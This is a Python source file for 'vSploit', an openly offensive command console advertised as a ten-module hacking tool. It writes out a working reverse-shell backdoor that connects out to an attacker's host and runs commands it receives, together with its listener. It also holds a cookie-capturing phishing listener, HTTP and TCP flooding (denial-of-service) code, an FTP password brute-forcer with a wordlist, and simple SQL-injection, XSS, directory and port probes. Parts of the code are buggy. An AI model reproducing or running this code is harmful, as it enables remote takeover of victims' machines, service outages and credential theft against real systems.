import colorama
import ftplib
import os 
import requests
import time
import socket
import sys
import threading
import random
import asyncio
import aiohttp

from colorama import Fore
from colorama import Style

host_ip = 'null'
port_ip = 'null'
set_file = 'null'
set_url = 'null'
set_num = 'null'
set_host = 'null'
set_port = 'null'
set_data = 'null'
set_threads = 'null'

colorama.init()

os.system('cls' if os.name == 'nt' else 'clear')

main = [
	f'''{Fore.YELLOW}
 _          _       _            _          _             _             _        _       
/\ \    _ / /\     / /\         /\ \       _\ \          /\ \          /\ \     /\ \     
\ \ \  /_/ / /    / /  \       /  \ \     /\__ \        /  \ \         \ \ \    \_\ \    
 \ \ \ \___\/    / / /\ \__   / /\ \ \   / /_ \_\      / /\ \ \        /\ \_\   /\__ \   
 / / /  \ \ \   / / /\ \___\ / / /\ \_\ / / /\/_/     / / /\ \ \      / /\/_/  / /_ \ \  
 \ \ \   \_\ \  \ \ \ \/___// / /_/ / // / /         / / /  \ \_\    / / /    / / /\ \ \ 
  \ \ \  / / /   \ \ \     / / /__\/ // / /         / / /   / / /   / / /    / / /  \/_/ 
   \ \ \/ / /_    \ \ \   / / /_____// / / ____    / / /   / / /   / / /    / / /        
    \ \ \/ //_/\__/ / /  / / /      / /_/_/ ___/\ / / /___/ / /___/ / /__  / / /         
     \ \  / \ \/___/ /  / / /      /_______/\__\// / /____\/ //\__\/_/___\/_/ /          
      \_\/   \_____\/   \/_/       \_______\/    \/_________/ \/_________/\_\/ 
      {Style.RESET_ALL}
  ---------[ vSploit : Copyright Pham Chien ]--------
  ---------[ 10 module haacking attack      ]--------
  ---------[ Twitter : @Anonym0us_VNPC      ]--------
  ---------[ Telegram : t.me/Anon0psNews    ]-------- 
                                                                                  
  ''',

	f'''{Fore.GREEN}
        _________      .__         .__  __   
___  __/   _____/_____ |  |   ____ |__|/  |_ 
\  \/ /\_____  \\____ \|  |  /  _ \|  \   __\
 \   / /        \  |_> >  |_(  <_> )  ||  |  
  \_/ /_______  /   __/|____/\____/|__||__|  
              \/|__|   
 {Style.RESET_ALL}
  ---------[ vSploit : Copyright Pham Chien ]--------
  ---------[ 10 module haacking attack      ]--------
  ---------[ Twitter : @Anonym0us_VNPC      ]--------
  ---------[ Telegram : t.me/Anon0psNews    ]-------- 
 ''',

  f'''{Fore.BLUE} 
        (                            
        )\ )        (             )  
   )   (()/(        )\     (   ( /(  
  /((   /(_))`  )  ((_) (  )\  )\()) 
 (_))\ (_))  /(/(   _   )\((_)(_))/  
 _)((_)/ __|((_)_\ | | ((_)(_)| |_   
 \ V / \__ \| '_ \)| |/ _ \| ||  _|  
  \_/  |___/| .__/ |_|\___/|_| \__|  
            |_|              
{Style.RESET_ALL}
  ---------[ vSploit : Copyright Pham Chien ]--------
  ---------[ 10 module haacking attack      ]--------
  ---------[ Twitter : @Anonym0us_VNPC      ]--------
  ---------[ Telegram : t.me/Anon0psNews    ]--------
 ''',

 	f'''{Fore.RED}
           ___     _ __     _               _      _     
  __ __   / __|   | '_ \   | |     ___     (_)    | |_   
  \ V /   \__ \   | .__/   | |    / _ \    | |    |  _|  
  _\_/_   |___/   |_|__   _|_|_   \___/   _|_|_   _\__|  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
{Style.RESET_ALL}
  ---------[ vSploit : Copyright Pham Chien ]--------
  ---------[ 10 module haacking attack      ]--------
  ---------[ Twitter : @Anonym0us_VNPC      ]--------
  ---------[ Telegram : t.me/Anon0psNews    ]--------
''',

]

banner = random.choice(main)

print(banner)

run = True
while True:
	command_main = input("vmsf6 > ")

	if command_main == 'show module':
		def modules():
			print('''
------------------------------------------------
   MODULE                          OPTIONS
------------------------------------------------
reverse_tcp_backdoor       created Backdoor File
phishing_http_cookie       created link phishing cookie
http_flood                 HTTP FLood Attack (DoS)
http_dos_attack            DoS Attack
http_tcp_dos               DoS Layer4 (TCP)
reverse_ftpd_crack         FTPd Cracked (PASSWORD)
sqli_scan                  SQLi Checking Vulns
xss_scan                   XSS Checking Vulns
reverse_http_enum          Checking Folder Website
scanner_portscan_tcp       Checking Port
------------------------------------------------
''')

		modules()

	elif command_main == 'help':
		def helping():
			print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 show module                 show all module
 set module                  update module
 help                        command for helping
-----------------------------------------------
 ''')

		helping()

	elif command_main == 'exit':
		print("[+] Session CLosed")
		exit()

	elif command_main == 'set module':
		set_module = input("[+] NAME MODULE : ")

		if set_module == 'reverse_tcp_backdoor':
			
			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")

			while True:
				module = input("vmsf6(reverse_tcp_backdoor) > ")


				if module == 'exit module':
					print("")
					print("[+] Back module")
					print("")
					break

				elif module == 'help':
					def helping1():
						print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set host                   update host system
 set port                   update port system 
 set file                   update file name
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
 ''')

					helping1()

				elif module == 'set host':
					host_ip = input("[+] HOST : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set host => {host_ip}")

				elif module == 'set port':
					port_ip = input("[+] PORT : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set PORT => {port_ip}")

				elif module == 'set file':
					set_file = input("[+] File Name : ")

					code = f'''
import socket
import subprocess
import os

IP = '{host_ip}'
PORT = {port_ip}

def connection():
	connect_session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect_session.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	connect_session.connect((IP, PORT))

	session = True
	while True:

		send_data = connect_session.recv(1024)

		if send_data == b'exit':
			print("[+] Close Session")
			connect_session.close()
			break

		else:

			proc_session = subprocess.Popen(send_data,
				shell=True,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)

			output_data = proc_session.stdout.read() + proc_session.stderr.read()

			connect_session.send(output_data)

connection()
'''

					with open(f'{set_file}', 'w') as filename:
						filename.write(code)

					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set filename => {set_file}")

				elif module == 'options':
					def options():
						print(f'''
------------------------------------------------
   	               OPTIONS
------------------------------------------------
   HOST       :  {host_ip}       
   PORT       :  {port_ip}
   FILE NAME  :  {set_file}
   PAYLOAD    :  {set_module}
-----------------------------------------------
''')
					options()


				elif module == "exploit":

					import socket
					import sys
					import os 

					HOST = str(f'{host_ip}')
					PORT = int(port_ip)

					def connection():
						connector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						connector.setsockopt(socket.SOL_SOCKET,
							socket.SO_REUSEADDR,
							2)
						connector.bind((HOST, PORT))
						connector.listen(2)

						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On ' + Fore.GREEN + f'{host_ip}:{port_ip}' + Style.RESET_ALL)
						time.sleep(2)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
						time.sleep(1)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ Fore.GREEN + str(host_ip) + ":" + str(port_ip) + '...' + Style.RESET_ALL)
						
						conn, addr = connector.accept()
						
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', Fore.GREEN, addr)
						time.sleep(2)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', Fore.GREEN, addr)
						time.sleep(1)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ' + Fore.GREEN + str(addr) + '...' + Style.RESET_ALL)

						session = True
		
						while True:
							print("")
							sys.stdout.write(Fore.BLUE + "meterpreter > " + Style.RESET_ALL)
							cmd_shell = sys.stdin.readline()

							if cmd_shell == b'exit\n':
								print("[+] Closed Session")
								conn.send(b'exit\n')
								conn.close()
								break

							elif cmd_shell != '\n':
								conn.send(cmd_shell.encode())
								cmd_output = conn.recv(1024)
								print(cmd_output)
					connection()

# ==============================================================================================================

		if set_module == 'phishing_http_cookie':
			
			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")

			while True:
				module = input(f"vmsf6({set_module}) > ")


				if module == 'exit module':
					print("")
					print("[+] Back module")
					print("")
					break

				elif module == 'help':
					def helping1():
						print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set host                   update host system
 set port                   update port system 
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
 ''')

					helping1()

				elif module == 'set host':
					host_ip = input("[+] HOST : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set host => {host_ip}")

				elif module == 'set port':
					port_ip = input("[+] PORT : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set PORT => {port_ip}")

				elif module == 'options':
					def options():
						print(f'''
------------------------------------------------
   	               OPTIONS
------------------------------------------------
   HOST       :  {host_ip}       
   PORT       :  {port_ip}
   URL        :  http://{host_ip}:{port_ip}/
   PAYLOAD    :  {set_module}
-----------------------------------------------
''')
					options()

				elif module == 'exploit':
					import socket
					import sys 

					HOST = str(f'{host_ip}')
					PORT = int(port_ip)

					def listening():
						for i in range(2):
							s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 100)
							s.bind((HOST, PORT))
							s.listen(100)

							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' Start Session On http://{HOST}:{PORT}')
							time.sleep(2)
							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' http://{HOST}:{PORT} listening...')
							
							conn, addr = s.accept()
							
							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' 1 {addr} has open the link...')
							time.sleep(2)

							output_data = conn.recv(1024)

							print("")
							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {output_data}')
							print("")

							session = True
						print("")
						print("[+] Session CLosed")
						print("")
						
					listening()

# =========================================================================================
		

		elif set_module == 'http_flood':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set url                    Update URL
 set num                    Update NUM
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set url':
					set_url = input("HOST : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set URL => {set_url}')

				elif module == 'set port':
					set_NUM = input("NUM : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set NUM => {set_num}')

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  URL        :  {set_url}
	  NUM PACKET :  {set_num}
	  PAYLOAD    :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import requests
					import threading

					URL_ATTACK = str(f'{set_url}')
					ATTACKING_NUM = int(set_num)

					def starting_requests():
						response = requests.get(URL_ATTACK)
						print(f"[+] Starting Attack On TArget : {set_url}")

					if __name__ == '__main__':
						threads = []

						for i in range(ATTACKING_NUM):
							t = threading.Thread(target=starting_requests)
							threads.append(t)

						for t in threads:
							t.start()

						for t in threads:
							t.join()

					print("[+] Done")
					back_main = input("back module ( Y/n ) > ")
					if back_main == "Y":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')
					elif back_main == "y":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')
					elif back_main == "N":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')
					elif back_main == "n":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')

# =========================================================================================


		elif set_module == 'http_dos_attack':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set url                    Update Url
 set num                    Update Num Packet
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set url':
					set_url = input("URL : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set URL => {set_url}')

				elif module == 'set num':
					set_num = input("NUM : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set NUM => {set_num}')

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  URL        :  {set_url}
	  NUM PACKET :  {set_num}
	  PAYLOAD    :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import asyncio
					import aiohttp

					HOST = str(f'{set_url}')

					async def send_requests(HOST):
						async with aiohttp.ClientSession() as session:
							async with session.get(HOST) as response:
								if response.status == 200:
									print(f"[+] Starting Attack On TArget : {HOST}")
								return response.text()

					async def main():
						ATTACKING_NUM = int(set_num)

						threads = []

						for i in range(ATTACKING_NUM):
							t = asyncio.ensure_future(send_requests(HOST))
							threads.append(t)

						await asyncio.gather(* threads * ATTACKING_NUM)

					if __name__ == '__main__':
						loop = asyncio.get_event_loop()
						loop.run_until_complete(main())

					print("[+] Done")
					back_main = input("back module ( Y/n ) > ")
					if back_main == "Y":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')
					elif back_main == "y":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')
					elif back_main == "N":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')
					elif back_main == "n":
						os.system('py main.py' if os.name == 'nt' else 'python3 main.py')


# ==================================================================================


		elif set_module == 'http_tcp_dos':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set host                   Update HOST IP
 set port                   Update PORT IP
 
 set data                   Update Data Size Packet
                            MAX : 1024 

 set num                    Update Num Packet
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set host':
					set_host = input("HOST : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set HOST => {set_host}')

				elif module == 'set port':
					set_port = input("PORT : ")
					print(Fore.BLUE + '[+]' + Style.RESET_ALL + f' set PORT => {set_port}')

				elif module == 'set num':
					set_num = input("NUM : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set NUM => {set_num}')

				elif  module == 'set data':
					set_data = input("DATA SIZE : ")
					if set_data <= f'1024':
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set DATA SIZE => {set_data}')
					else:
						set_data = 'null'
						print(Fore.RED + '[*]' + Style.RESET_ALL + f" the DATA SIZE not valid")
						print(Fore.RED + '[*]' + Style.RESET_ALL + f" MAX SIZE : 1024")

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  HOST       :  {set_host}
	  PORT       :  {set_port}
	  NUM PACKET :  {set_num}
	  DATA SIZE  :  {set_data}
	  PAYLOAD    :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import socket 
					import threading

					IP = f'{set_host}'
					PORT = int(set_port)
					ATTACKING_NUM = int(set_num)
					DATA_SIZE = b'a' * (1024 * 1024 * int(set_data))

					def socket_requests():
						for i in range(ATTACKING_NUM):
							s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							s.connect((IP, PORT))
							s.sendalll(DATA_SIZE)
							s.sendto(DATA_SIZE)
							print(f"[+] Starting Packet DATA on Target => {IP}:{PORT}")
							s.close()

					threads = []
					for i in range(ATTACKING_NUM):
						t = threading.Thread(target=socket_requests)
						threads.append(t)

					for t in threads:
						t.start()

					for t in threads:
						t.join()

# =====================================================================================


		elif set_module == 'reverse_ftpd_crack':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set host                   Update Host
 set port                   Updtae Port
 set threads                Update Num Packet
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set host':
					set_host = input("URL : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set HOST => {set_host}')

				elif module == 'set port':
					set_port = input("NUM : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set PORT => {set_port}')

				elif module == 'set threads':
					set_threads = input("THREADS : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set THREADS => {set_threads}')


				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  HOST       :  {set_host}
	  PORT       :  {set_port}
	  THREADS    :  {set_threads}
	  PAYLOAD    :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import socket 
					import ftplib
					import random
					import time 

					ip = str(f'{set_host}')
					port = 21

					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(1)

					code = s.connect_ex((ip, port))

					if code == 0:

						usernames = [
							'admin',
							'test123',
							'test',
							'ftpd',
							'root',
							'raj',
							'toor',
							'pavan',
						]

						passwords = [
							'admin',
							'test123',
							'test',
							'ftpd',
							'root',
							'raj',
							'toor',
							'pavan',
						]

						ftp = ftplib.FTP(ip)

						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting FTP Login sweep')
						time.sleep(3)

						for username in usernames:
							for password in passwords:

								try:
									ftp.login(username, password)
									print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' login success: {username}:{password}')

								except ftplib.error_perm:
									print(Fore.RED + '[*]' + Style.RESET_ALL + f' login failed: {username}:{password}')
									time.sleep(1)

					else:
					  print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' port 21 not open')


# =====================================================================================


		elif set_module == 'sqli_scan':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set url                    Update Url
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set url':
					set_url = input("URL : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set URL => {set_url}')

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  URL        :  {set_url}
	  MODULE     :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import requests

					URL = str(f'{set_url}')

					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting checking vulners on Target {set_url}')
					payload = [
						'/index.php?id=%27',
						'/product.php?id=%27',
						'/product_detail.php?id=%27',
						'/search.php?q=%27',
						'/search.php?query=%27',
						'/search.php?test=%27',
						'/index.php?id=%27',
						'/product.php?id=%27',
						'/product_detail.php?id=%27',
						'/search.php?q=%27',
						'/search.php?query=%27',
						'/search.php?test=%27',
					]

					for payloads in payload:
						def check():
							response = requests.get(URL + payloads)
							if "Warning: mysql_" in response.text:
								print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' {set_url}{payloads} : Vulnerable SQLI')
							elif "on line" in response.text:
								print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {set_url}{payloads} : Vulnerable SQLI')
							else:
								print(Fore.RED + '[*]' + Style.RESET_ALL + f' {set_url}{payloads} : Not Vulnerable')

						check()

# =====================================================================================


		elif set_module == 'xss_scan':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set url                    Update Url
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set url':
					set_url = input("URL : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set URL => {set_url}')

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  URL        :  {set_url}
	  MODULE     :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import requests

					URL = str(f'{set_url}')

					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting checking vulners on Target {set_url}')
					payload = [
						'/index.php?id=%27=<h1>Checked XSS By vSploit</h1>',
						'/product.php?id=%27<h1>Checked XSS By vSploit</h1>',
						'/product_detail.php?id=%27<h1>Checked XSS By vSploit</h1>',
						'/search.php?q=%27<h1>Checked XSS By vSploit</h1>',
						'/search.php?query=%27<h1>Checked XSS By vSploit</h1>',
						'/search.php?test=%27<h1>Checked XSS By vSploit</h1>',
						'/index.php?id=%27=<h1>Checked XSS By vSploit</h1>',
						'/product.php?id=%27<h1>Checked XSS By vSploit</h1>',
						'/product_detail.php?id=%27<h1>Checked XSS By vSploit</h1>',
						'/search.php?q=%27<h1>Checked XSS By vSploit</h1>',
						'/search.php?query=%27<h1>Checked XSS By vSploit</h1>',
						'/search.php?test=%27<h1>Checked XSS By vSploit</h1>',
					]

					for payloads in payload:
						def check():
							response = requests.get(URL + payloads)
							if "Checked XSS By vSploit" in response.text:
								print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {set_url}{payloads} : Vulnerable XSS')
							else:
								print(Fore.RED + '[*]' + Style.RESET_ALL + f' {set_url}{payloads} : Not Vulnerable')

						check()


# =====================================================================================


		elif set_module == 'reverse_http_enum':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")


			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set url                    Update Url
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set url':
					set_url = input("URL : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set URL => {set_url}')

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  URL        :  {set_url}
	  MODULE     :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import requests

					URL = str(f'{set_url}')

					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting checking http-enum Target {set_url}')
					
					payload = [
						'/admin',
						'/wp-admin',
						'/robots.txt',
						'/index.php',
						'/webadmin.php',
						'/login',
						'/login.php',
						'/doc',
						'/docs',
						'/documentation',
						'/xsl',
						'/wwhelp',
						'/exchange',
						'/content',
						'/_vti_bin',
						'/Desktop',
						'/DragonSkin',
						'/EditTablePlugin',
						'/FileAttachment',
						'/Laptop',
						'/Main',
						'/PatternSkin',
						'/PatternSkinCss',
						'/PatternSkinCustomization',
						'/PatternSkinPalette',
						'/PlainSkin',
						'/Plugins',
					]

					for payloads in payload:
						response = requests.get(URL + payloads)
						if response.status_code == 200:
							if '404' in response.text:
								print(Fore.RED + '[*]' + Style.RESET_ALL + f' {payloads} not found folders')
							elif response.status_code == 404:
								print(Fore.RED + '[*]' + Style.RESET_ALL + f' {payloads} not found folders')
							else:
								print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {payloads} found folders')
						else:
							print(Fore.RED + '[*]' + Style.RESET_ALL + f' {payloads} not found folders')


# =====================================================================================


		elif set_module == 'scanner_portscan_tcp':

			print("")
			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
			print("")

			session = True
			while True:
				module = input(f"vmsf6({set_module}) > ")

				if module == 'help':
					def helping1():
							print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set host                   Update HOST
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
	 ''')

					helping1()

				elif module == 'exit module':
					print("")
					print("[+] back module...")
					print("")
					break

				elif module == 'set host':
					set_host = input("HOST : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set HOST => {set_host}')

				elif module == 'options':
					def options():
							print(f'''
------------------------------------------------
	   	            OPTIONS
------------------------------------------------
	  HOST       :  {set_host}
	  MODULE     :  {set_module}
-----------------------------------------------
''')

					options()

				elif module == 'exploit':
					import socket

					URL = str(f'{set_host}')

					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting checking PORT Target {URL}')

					for port_tcp in range(1, 200):
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.settimeout(0.01)

						code = s.connect_ex((URL, port_tcp))

						if code == 0:
							print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' {URL}:{port_tcp} - TCP OPEN PORT')
		else:
			print("")
			print(Fore.RED + '[*]' + Style.RESET_ALL + f' valid modules input')
			print("")
			break
